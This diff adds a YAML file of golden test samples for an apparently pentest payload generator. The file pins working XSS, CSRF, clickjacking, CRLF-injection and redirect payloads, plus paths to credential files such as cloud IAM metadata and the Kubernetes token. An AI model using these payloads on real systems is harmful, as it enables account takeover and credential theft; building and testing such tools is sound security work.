@@ -1,0 +1,796 @@
+# Web 客户端侧扩充批次的黄金样本（XSS / 泄露 / CSRF / CRLF / 重定向 / CORS）。
+#
+# 期望值全部**照着 body 手推**：槽位默认值代入 → 变量替换 → 没有绕过、没有传输编码，
+# 所以 raw 就是代入后的原串。载荷含多行 HTML 或用块标量写的，期望值也用 `|-`
+# （末尾不留换行——body 自己也是 `|-`，多一个换行逐字节比对就会挂）。
+#
+# 覆盖：
+#   xss      mxss.mutated / dom.clobber / polyglot / csp.jsonp /
+#            framework.rawhtml / scheme.tag / waf.attrsep
+#   leak     vcs.git_refs / vcs.svn_pristine / vcs.misc / config.framework /
+#            config.registry / debug.actuator_ops / debug.graphql / debug.search /
+#            debug.jenkins / backup.combo / cloud.metadata / cloud.container
+#   csrf     json.no_cors / json.xhr / token.length_only / token.url_param /
+#            token.read_then_submit / multi.step_chain / samesite.checklist /
+#            samesite.redirect / clickjacking.double_frame
+#   crlf     request.inject / response.split.full / cookie.inject
+#   redirect scheme.ctrl_char
+#   cors     probe.scheme_downgrade
+#
+# 每条模板至少一条样本；有槽位或变量的，另补一条切到非默认取值的，
+# 免得哪天默认值改了、模板和样本一起错还看不出来。
+# 两处特意钉住容易写错的地方：
+#   1. 变量漏填时保留 <<名字>> 字面量（契约 3，没有默认值）——
+#      这里挑 csrf.generic.multi.step_chain 留一条不填 endpoint 的。
+#   2. crlf 的 nl=raw 时 seq 是**真的 CR LF 两个字符**，不是 %0d%0a 这四个可见字符，
+#      所以期望值用双引号写 \r\n。
+#
+# content_type 是 html / raw / url / file-path 的都没有可靠 parser，运行期会如实
+# 返回「未校验」，所以这些条目断言 syntax: unchecked——写 ok 会挂，写 fail 是撒谎。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= XSS · 突变型与 DOM 覆盖 =================
+
+  - name: XSS · mXSS（默认 noscript 变异点）
+    state:
+      vuln: xss
+      template: xss.generic.mxss.mutated
+      outputs: [raw]
+    expect:
+      # <<mxss.head>> = <noscript><p title="</noscript><img src=x onerror=
+      # <<js>> 默认 alert(1)，<<mxss.tail>> = ">
+      payload: |-
+        <noscript><p title="</noscript><img src=x onerror=alert(1)">
+      checks_count: 0
+      syntax: unchecked
+
+  - name: XSS · mXSS（换成 xmp 变异点）
+    state:
+      vuln: xss
+      template: xss.generic.mxss.mutated
+      slots: {mxss: xmp}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <xmp><p title="</xmp><img src=x onerror=alert(1)">
+      syntax: unchecked
+
+  - name: XSS · DOM clobbering（默认 form + input）
+    state:
+      vuln: xss
+      template: xss.generic.dom.clobber
+      vars: {name: config, prop: url, value: "/x"}
+      outputs: [raw]
+    expect:
+      # 槽位选项值里嵌的 <<name>> / <<prop>> / <<value>> 走变量替换阶段，
+      # 引号在选项文本里、包住占位符
+      payload: |-
+        <form id="config" name="config"><input name="url" value="/x"></form>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: XSS · DOM clobbering（同名两个 a）
+    state:
+      vuln: xss
+      template: xss.generic.dom.clobber
+      slots: {shape: two_anchor}
+      vars: {name: csrf, prop: token, value: "https://evil.example/x"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <a id="csrf"></a><a id="csrf" name="token" href="https://evil.example/x"></a>
+      syntax: unchecked
+
+  # ================= XSS · 广谱载荷 =================
+
+  - name: XSS · polyglot（默认 alert(1)）
+    state:
+      vuln: xss
+      template: xss.generic.polyglot
+      outputs: [raw]
+    expect:
+      # <<js>> 出现两次，两处都换成默认值；其余字符是 0xsobky polyglot 原文
+      payload: |-
+        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+      checks_count: 0
+      syntax: unchecked
+
+  - name: XSS · polyglot（换成读域名）
+    state:
+      vuln: xss
+      template: xss.generic.polyglot
+      slots: {js: "alert(document.domain)"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e
+      syntax: unchecked
+
+  # ================= XSS · CSP 与框架 =================
+
+  - name: XSS · 借白名单域 JSONP 绕 CSP（默认 callback）
+    state:
+      vuln: xss
+      template: xss.generic.csp.jsonp
+      vars: {trusted: cdn.example.com, endpoint: jsonp}
+      outputs: [raw]
+    expect:
+      # 协议头 https:// 与 ?=alert 都写死在 body 里，变量只填域名与路径
+      payload: |-
+        <script src="https://cdn.example.com/jsonp?callback=alert"></script>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: XSS · 借白名单域 JSONP 绕 CSP（换回调参数名）
+    state:
+      vuln: xss
+      template: xss.generic.csp.jsonp
+      slots: {cb: cb}
+      vars: {trusted: static.example.net, endpoint: api/j}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <script src="https://static.example.net/api/j?cb=alert"></script>
+      syntax: unchecked
+
+  - name: XSS · 框架原始 HTML sink（默认 img）
+    state:
+      vuln: xss
+      template: xss.generic.framework.rawhtml
+      outputs: [raw]
+    expect:
+      payload: |-
+        <img src=x onerror=alert(1)>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: XSS · 框架原始 HTML sink（svg onload）
+    state:
+      vuln: xss
+      template: xss.generic.framework.rawhtml
+      slots: {tag: svg}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <svg onload=alert(1)>
+      syntax: unchecked
+
+  - name: XSS · 带标签的伪协议（默认 iframe srcdoc）
+    state:
+      vuln: xss
+      template: xss.generic.scheme.tag
+      outputs: [raw]
+    expect:
+      # <<tag.head>> = <iframe srcdoc="<script>，<<tag.tail>> = </script>"></iframe>
+      payload: |-
+        <iframe srcdoc="<script>alert(1)</script>"></iframe>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: XSS · 带标签的伪协议（form action）
+    state:
+      vuln: xss
+      template: xss.generic.scheme.tag
+      slots: {tag: form_action}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="javascript:alert(1)"><input type="submit"></form>
+      syntax: unchecked
+
+  # ================= XSS · WAF 绕过写法 =================
+
+  - name: XSS · 属性间多个空格（默认）
+    state:
+      vuln: xss
+      template: xss.generic.waf.attrsep
+      outputs: [raw]
+    expect:
+      # gap.seq 默认是三个空格，两处都代入；属性值一律不加引号
+      payload: |-
+        <img   src=x   onerror=alert(1)>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: XSS · 属性间 %0a（值会先被解码一次时用）
+    state:
+      vuln: xss
+      template: xss.generic.waf.attrsep
+      slots: {gap: nl}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <img%0asrc=x%0aonerror=alert(1)>
+      syntax: unchecked
+
+  # ================= 敏感信息泄露 · 版本控制 =================
+
+  - name: 泄露 · Git reflog（默认 logs/HEAD）
+    state:
+      vuln: leak
+      template: leak.generic.vcs.git_refs
+      outputs: [raw]
+    expect:
+      payload: "/.git/logs/HEAD"
+      checks_count: 0
+      syntax: unchecked
+
+  - name: 泄露 · Git packed-refs
+    state:
+      vuln: leak
+      template: leak.generic.vcs.git_refs
+      slots: {file: "/.git/packed-refs"}
+      outputs: [raw]
+    expect:
+      payload: "/.git/packed-refs"
+      syntax: unchecked
+
+  - name: 泄露 · SVN pristine 库（默认目录）
+    state:
+      vuln: leak
+      template: leak.generic.vcs.svn_pristine
+      outputs: [raw]
+    expect:
+      # 值自带结尾斜杠，body 里不再补分隔符
+      payload: "/.svn/pristine/"
+      syntax: unchecked
+
+  - name: 泄露 · SVN 工作副本格式
+    state:
+      vuln: leak
+      template: leak.generic.vcs.svn_pristine
+      slots: {file: "/.svn/format"}
+      outputs: [raw]
+    expect:
+      payload: "/.svn/format"
+      syntax: unchecked
+
+  - name: 泄露 · 其它版本控制（默认 Hg store）
+    state:
+      vuln: leak
+      template: leak.generic.vcs.misc
+      outputs: [raw]
+    expect:
+      payload: "/.hg/store/"
+      syntax: unchecked
+
+  - name: 泄露 · 其它版本控制（CVS/Entries）
+    state:
+      vuln: leak
+      template: leak.generic.vcs.misc
+      slots: {file: "/CVS/Entries"}
+      outputs: [raw]
+    expect:
+      payload: "/CVS/Entries"
+      syntax: unchecked
+
+  # ================= 敏感信息泄露 · 框架配置与凭据 =================
+
+  - name: 泄露 · 框架配置（默认 Rails database.yml）
+    state:
+      vuln: leak
+      template: leak.generic.config.framework
+      outputs: [raw]
+    expect:
+      payload: "/config/database.yml"
+      syntax: unchecked
+
+  - name: 泄露 · 框架配置（Django settings.py）
+    state:
+      vuln: leak
+      template: leak.generic.config.framework
+      slots: {file: "/settings.py"}
+      outputs: [raw]
+    expect:
+      payload: "/settings.py"
+      syntax: unchecked
+
+  - name: 泄露 · 仓库凭据（默认 .npmrc）
+    state:
+      vuln: leak
+      template: leak.generic.config.registry
+      outputs: [raw]
+    expect:
+      payload: "/.npmrc"
+      syntax: unchecked
+
+  - name: 泄露 · 仓库凭据（.netrc）
+    state:
+      vuln: leak
+      template: leak.generic.config.registry
+      slots: {file: "/.netrc"}
+      outputs: [raw]
+    expect:
+      payload: "/.netrc"
+      syntax: unchecked
+
+  # ================= 敏感信息泄露 · 调试端点 =================
+
+  - name: 泄露 · Actuator 观测端点（默认 httptrace）
+    state:
+      vuln: leak
+      template: leak.generic.debug.actuator_ops
+      outputs: [raw]
+    expect:
+      payload: "/actuator/httptrace"
+      syntax: unchecked
+
+  - name: 泄露 · Actuator loggers（可改日志级别）
+    state:
+      vuln: leak
+      template: leak.generic.debug.actuator_ops
+      slots: {file: "/actuator/loggers"}
+      outputs: [raw]
+    expect:
+      payload: "/actuator/loggers"
+      syntax: unchecked
+
+  - name: 泄露 · GraphQL（默认只探端点）
+    state:
+      vuln: leak
+      template: leak.generic.debug.graphql
+      outputs: [raw]
+    expect:
+      payload: "/graphql"
+      syntax: unchecked
+
+  - name: 泄露 · GraphQL（带内省查询串）
+    state:
+      vuln: leak
+      template: leak.generic.debug.graphql
+      slots: {ep: introspect}
+      outputs: [raw]
+    expect:
+      # 查询串里的花括号是选项文本的一部分，原样落在载荷里
+      payload: "/graphql?query={__schema{types{name}}}"
+      syntax: unchecked
+
+  - name: 泄露 · 搜索引擎端点（默认 _cat/indices）
+    state:
+      vuln: leak
+      template: leak.generic.debug.search
+      outputs: [raw]
+    expect:
+      payload: "/_cat/indices"
+      syntax: unchecked
+
+  - name: 泄露 · 搜索引擎端点（Solr 控制台）
+    state:
+      vuln: leak
+      template: leak.generic.debug.search
+      slots: {file: "/solr/admin/"}
+      outputs: [raw]
+    expect:
+      payload: "/solr/admin/"
+      syntax: unchecked
+
+  - name: 泄露 · Jenkins 脚本控制台（默认 /script）
+    state:
+      vuln: leak
+      template: leak.generic.debug.jenkins
+      outputs: [raw]
+    expect:
+      payload: "/script"
+      syntax: unchecked
+
+  - name: 泄露 · Jenkins 装在子路径下
+    state:
+      vuln: leak
+      template: leak.generic.debug.jenkins
+      slots: {file: "/jenkins/script"}
+      outputs: [raw]
+    expect:
+      payload: "/jenkins/script"
+      syntax: unchecked
+
+  # ================= 敏感信息泄露 · 备份组合 =================
+
+  - name: 泄露 · 备份组合（默认 backup + .zip）
+    state:
+      vuln: leak
+      template: leak.generic.backup.combo
+      outputs: [raw]
+    expect:
+      # 两个字符串槽位直接相邻拼接，分隔符在选项值里（stem 自带前导斜杠）
+      payload: "/backup.zip"
+      syntax: unchecked
+
+  - name: 泄露 · 备份组合（www + .tar.gz）
+    state:
+      vuln: leak
+      template: leak.generic.backup.combo
+      slots: {stem: "/www", ext: ".tar.gz"}
+      outputs: [raw]
+    expect:
+      payload: "/www.tar.gz"
+      syntax: unchecked
+
+  # ================= 敏感信息泄露 · 云与容器 =================
+
+  - name: 泄露 · 云元数据（默认先看目录）
+    state:
+      vuln: leak
+      template: leak.generic.cloud.metadata
+      outputs: [raw]
+    expect:
+      payload: "/latest/meta-data/"
+      syntax: unchecked
+
+  - name: 泄露 · 云元数据（IAM 临时凭据）
+    state:
+      vuln: leak
+      template: leak.generic.cloud.metadata
+      slots: {file: "/latest/meta-data/iam/security-credentials/"}
+      outputs: [raw]
+    expect:
+      payload: "/latest/meta-data/iam/security-credentials/"
+      syntax: unchecked
+
+  - name: 泄露 · 容器凭据（默认 kubeconfig）
+    state:
+      vuln: leak
+      template: leak.generic.cloud.container
+      outputs: [raw]
+    expect:
+      payload: "/kubeconfig"
+      syntax: unchecked
+
+  - name: 泄露 · 容器凭据（ServiceAccount token 的 Web 映射）
+    state:
+      vuln: leak
+      template: leak.generic.cloud.container
+      slots: {file: "/var/run/secrets/kubernetes.io/serviceaccount/token"}
+      outputs: [raw]
+    expect:
+      # 这条只在 Web 根目录被设成 / 时才是 URL；载荷就是那条绝对路径
+      payload: "/var/run/secrets/kubernetes.io/serviceaccount/token"
+      syntax: unchecked
+
+  # ================= CSRF · JSON 接口的另外两种发法 =================
+
+  - name: CSRF · fetch 加 mode:no-cors
+    state:
+      vuln: csrf
+      template: csrf.generic.json.no_cors
+      vars: {target: "http://a/b", json: '{"role":"admin"}'}
+      outputs: [raw]
+    expect:
+      # 单引号是 body 里写死的 JS 字符串边界，JSON 里的双引号原样落在里面
+      payload: "<script>fetch('http://a/b',{method:'POST',mode:'no-cors',credentials:'include',body:'{\"role\":\"admin\"}'})</script>"
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · XMLHttpRequest 发 JSON
+    state:
+      vuln: csrf
+      template: csrf.generic.json.xhr
+      vars: {target: "http://a/b", json: '{"role":"admin"}'}
+      outputs: [raw]
+    expect:
+      # 一条都不设 setRequestHeader：send 收到字符串时浏览器自己声明 text/plain
+      payload: |-
+        <script>
+        var x=new XMLHttpRequest();
+        x.open('POST','http://a/b',true);
+        x.withCredentials=true;
+        x.send('{"role":"admin"}');
+        </script>
+      checks_count: 0
+      syntax: unchecked
+
+  # ================= CSRF · token 的存放位置与校验方式 =================
+
+  - name: CSRF · token 只校验形态（默认 32 位十六进制）
+    state:
+      vuln: csrf
+      template: csrf.generic.token.length_only
+      vars: {target: "http://a/b", key: email, value: attacker@evil.example, tokenname: csrf_token}
+      outputs: [raw]
+    expect:
+      # token 值来自槽位选项的 token 字段，是 32 个 a
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="csrf_token" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+        <input type="hidden" name="email" value="attacker@evil.example">
+        </form>
+        <script>document.forms[0].submit()</script>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · token 只校验形态（UUID 形态）
+    state:
+      vuln: csrf
+      template: csrf.generic.token.length_only
+      slots: {fmt: uuid}
+      vars: {target: "http://a/b", key: role, value: admin, tokenname: _csrf}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="_csrf" value="00000000-0000-0000-0000-000000000000">
+        <input type="hidden" name="role" value="admin">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · token 挂在 URL 查询串上
+    state:
+      vuln: csrf
+      template: csrf.generic.token.url_param
+      vars: {target: "http://a/b", key: email, value: attacker@evil.example,
+             tokenname: _csrf, token: AAA}
+      outputs: [raw]
+    expect:
+      # token 拼在 action 的查询串里，不在表单体里
+      payload: |-
+        <form action="http://a/b?_csrf=AAA" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.example">
+        </form>
+        <script>document.forms[0].submit()</script>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · 先跨站读回 token 再提交
+    state:
+      vuln: csrf
+      template: csrf.generic.token.read_then_submit
+      vars: {endpoint: "https://t.example/edit", target: "https://t.example/save",
+             key: email, value: a@evil.example, tokenname: csrf_token}
+      outputs: [raw]
+    expect:
+      # 第一步用带凭据的 fetch 读页面正文，正则抠出第一个 value=，再拼表单提交
+      payload: |-
+        <script>
+        fetch('https://t.example/edit',{credentials:'include'}).then(r=>r.text()).then(function(t){
+        var m=/value="([^"]+)"/.exec(t);
+        var f=document.createElement('form');
+        f.method='POST';
+        f.action='https://t.example/save';
+        f.innerHTML='<input name="email" value="a@evil.example"><input name="csrf_token" value="'+(m?m[1]:'')+'">';
+        document.body.appendChild(f);
+        f.submit();
+        });
+        </script>
+      syntax: unchecked
+
+  # ================= CSRF · 多步操作 =================
+
+  - name: CSRF · 多步操作链（默认延时 3000）
+    state:
+      vuln: csrf
+      template: csrf.generic.multi.step_chain
+      vars: {endpoint: "http://a/s1", target: "http://a/s2", key: email, value: a@evil.example}
+      outputs: [raw]
+    expect:
+      # <<ms>> 是槽位，默认值 3000 直接代入 setTimeout 的第二个参数
+      payload: |-
+        <iframe name="s" src="http://a/s1" style="display:none"></iframe>
+        <form id="f" action="http://a/s2" method="POST" target="s">
+        <input type="hidden" name="email" value="a@evil.example">
+        </form>
+        <script>setTimeout(function(){document.getElementById('f').submit()},3000)</script>
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · 多步操作链（延时改 1000）
+    state:
+      vuln: csrf
+      template: csrf.generic.multi.step_chain
+      slots: {ms: "1000"}
+      vars: {endpoint: "http://a/s1", target: "http://a/s2", key: email, value: a@evil.example}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <iframe name="s" src="http://a/s1" style="display:none"></iframe>
+        <form id="f" action="http://a/s2" method="POST" target="s">
+        <input type="hidden" name="email" value="a@evil.example">
+        </form>
+        <script>setTimeout(function(){document.getElementById('f').submit()},1000)</script>
+      syntax: unchecked
+
+  - name: CSRF · 多步操作链没填 step1（契约 3，不给默认值）
+    state:
+      vuln: csrf
+      template: csrf.generic.multi.step_chain
+      vars: {target: "http://a/s2", key: email, value: a@evil.example}
+      outputs: [raw]
+    expect:
+      # 漏填的变量保留 <<endpoint>> 字面量，产出明显不可用的串而不是替用户猜
+      payload: |-
+        <iframe name="s" src="<<endpoint>>" style="display:none"></iframe>
+        <form id="f" action="http://a/s2" method="POST" target="s">
+        <input type="hidden" name="email" value="a@evil.example">
+        </form>
+        <script>setTimeout(function(){document.getElementById('f').submit()},3000)</script>
+      syntax: unchecked
+
+  # ================= CSRF · SameSite 的边界 =================
+
+  - name: CSRF · SameSite 判定清单
+    state:
+      vuln: csrf
+      template: csrf.generic.samesite.checklist
+      outputs: [raw]
+    expect:
+      # 无槽位无变量，body 原样输出
+      payload: |-
+        SameSite 判定清单（照目标 Set-Cookie 的写法逐条对）：
+        1. 未声明 SameSite → Chrome 80+ 按 Lax 处理
+        2. SameSite=Lax → 跨站子资源不带 Cookie；顶层 GET 导航带；跨站 POST 不带
+        3. SameSite=None 且带 Secure → 跨站请求一律带上，等于没有 CSRF 防护
+        4. SameSite=None 但缺 Secure → Chrome 89+ 直接拒收这个 Cookie
+        5. 未声明 SameSite 且 Cookie 刚设置不到 2 分钟 → Chrome 的 Lax+POST 例外会带上它
+        6. SameSite=Strict → 跨站请求一律不带
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · 用 302 换同站发起（默认 url 参数）
+    state:
+      vuln: csrf
+      template: csrf.generic.samesite.redirect
+      vars: {target: "http://a/r", endpoint: "http://a/do"}
+      outputs: [raw]
+    expect:
+      # 跳转参数名与 = 之后的地址都要再 encodeURIComponent 包一层，这是 body 里写死的
+      payload: "<script>location='http://a/r?url='+encodeURIComponent('http://a/do')</script>"
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · 用 302 换同站发起（换 next 参数）
+    state:
+      vuln: csrf
+      template: csrf.generic.samesite.redirect
+      slots: {pname: next}
+      vars: {target: "http://a/r", endpoint: "http://a/do"}
+      outputs: [raw]
+    expect:
+      payload: "<script>location='http://a/r?next='+encodeURIComponent('http://a/do')</script>"
+      syntax: unchecked
+
+  # ================= CSRF · 点击劫持 =================
+
+  - name: CSRF · 点击劫持（双 iframe 嵌套）
+    state:
+      vuln: csrf
+      template: csrf.generic.clickjacking.double_frame
+      vars: {target: "http://a/b"}
+      outputs: [raw]
+    expect:
+      # style 里的花括号、iframe 的属性都是 body 原样；只有 d.write 里那个 src 是变量
+      payload: |-
+        <style>
+        html,body{margin:0;height:100%}
+        #bait{position:absolute;top:320px;left:38%;z-index:1;font-size:24px}
+        #outer{position:absolute;top:0;left:0;width:100%;height:100%;border:0;opacity:0.0001;z-index:2}
+        </style>
+        <div id="bait">点这里继续</div>
+        <iframe id="outer" src="about:blank" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+        <script>
+        var d=document.getElementById('outer').contentDocument;
+        d.open();
+        d.write('<iframe src="http://a/b" style="width:100%;height:100%;border:0"></iframe>');
+        d.close();
+        </script>
+      checks_count: 0
+      syntax: unchecked
+
+  # ================= CRLF · 请求头注入与完整响应 =================
+
+  - name: CRLF · 请求头里注入（默认探针头）
+    state:
+      vuln: crlf
+      template: crlf.generic.request.inject
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      # <<nl.seq>> = %0d%0a，后面跟注入内容的 text 字段
+      payload: '%0d%0aX-Crlf-Probe:%20true'
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CRLF · 请求头里注入（原样 CRLF + 伪造日志行）
+    state:
+      vuln: crlf
+      template: crlf.generic.request.inject
+      slots: {nl: raw, inj: log}
+      outputs: [raw]
+    expect:
+      # nl=raw 时 seq 是真的 CR LF 两个字符
+      payload: "\r\n1970-01-01T00:00:00Z%20INFO%20login%20ok%20user=admin"
+      syntax: unchecked
+
+  - name: CRLF · 拆出完整响应（默认 200 + %0d%0a）
+    state:
+      vuln: crlf
+      template: crlf.generic.response.split.full
+      slots: {nl: crlf, resp: ok}
+      outputs: [raw]
+    expect:
+      # 换行序列依次是：结束当前头、结束头段、分隔新响应的头与正文（两个）
+      payload: '%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aConnection:%20close%0d%0a%0d%0a<script>alert(1)</script>'
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CRLF · 拆出完整响应（原样 CRLF + 302）
+    state:
+      vuln: crlf
+      template: crlf.generic.response.split.full
+      slots: {nl: raw, resp: redirect}
+      outputs: [raw]
+    expect:
+      payload: "\r\n\r\nHTTP/1.1%20302%20Found\r\nContent-Type:%20text/html\r\nConnection:%20close\r\n\r\n<script>alert(1)</script>"
+      syntax: unchecked
+
+  - name: CRLF · 从 Cookie 值注入（默认带字母前缀）
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.inject
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      # <<pre.text>> = x，接 <<nl.seq>> = %0d%0a，再接注入的头
+      payload: 'x%0d%0aX-Crlf-Probe:%20injected'
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CRLF · 从 Cookie 值注入（原样 CRLF + 空前缀）
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.inject
+      slots: {nl: raw, pre: empty}
+      outputs: [raw]
+    expect:
+      # empty 选项的 text 是空串，代入后什么也不留，载荷以换行开头
+      payload: "\r\nX-Crlf-Probe:%20injected"
+      syntax: unchecked
+
+  # ================= 开放重定向 · 协议名变形 =================
+
+  - name: 重定向 · 协议名里插真 TAB
+    state:
+      vuln: redirect
+      template: redirect.generic.scheme.ctrl_char
+      outputs: [raw]
+    expect:
+      # ctrl.seq 默认是真的 TAB 字符（不是 %09 这四个可见字符）
+      payload: "java\tscript:alert(1)"
+      checks_count: 0
+      syntax: unchecked
+
+  - name: 重定向 · 协议名里插 %09
+    state:
+      vuln: redirect
+      template: redirect.generic.scheme.ctrl_char
+      slots: {ctrl: tab_enc}
+      vars: {}
+      outputs: [raw]
+    expect:
+      payload: "java%09script:alert(1)"
+      syntax: unchecked
+
+  # ================= CORS · 协议降级探测 =================
+
+  - name: CORS · Origin 降级到 http（默认）
+    state:
+      vuln: cors
+      template: cors.generic.probe.scheme_downgrade
+      vars: {trusted: target.com}
+      outputs: [raw]
+    expect:
+      # 协议来自槽位，域名来自变量，中间是写死的 ://
+      payload: "http://target.com"
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CORS · Origin 降级探测的对照（https）
+    state:
+      vuln: cors
+      template: cors.generic.probe.scheme_downgrade
+      slots: {scheme: https}
+      vars: {trusted: target.com}
+      outputs: [raw]
+    expect:
+      payload: "https://target.com"
+      syntax: unchecked
